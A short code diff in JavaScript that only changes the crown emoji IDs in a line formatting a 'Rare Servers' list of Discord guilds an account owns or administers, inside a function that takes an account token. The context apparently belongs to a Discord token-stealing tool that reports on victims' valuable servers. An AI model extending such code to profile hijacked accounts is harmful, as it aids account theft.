@@ -300,7 +300,7 @@ const getServers = async token => {
         if (rareGuilds === "") {
             rareGuilds += `**Rare Servers:**\n`;
         }
-        rareGuilds += `${guild.owner ? "<:blackcrown:1237300746421010466> Owner" : "<:bluecrown:1239583787369627739> Admin"} | \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
+        rareGuilds += `${guild.owner ? "<:blackcrown:1309423750222970880> Owner" : "<:bluecrown:1309426325479489567> Admin"} | \`${guild.name}\` - Members: \`${guild.approximate_member_count}\`\n`;
     }
 
     rareGuilds = rareGuilds || "**No Rare Servers**";
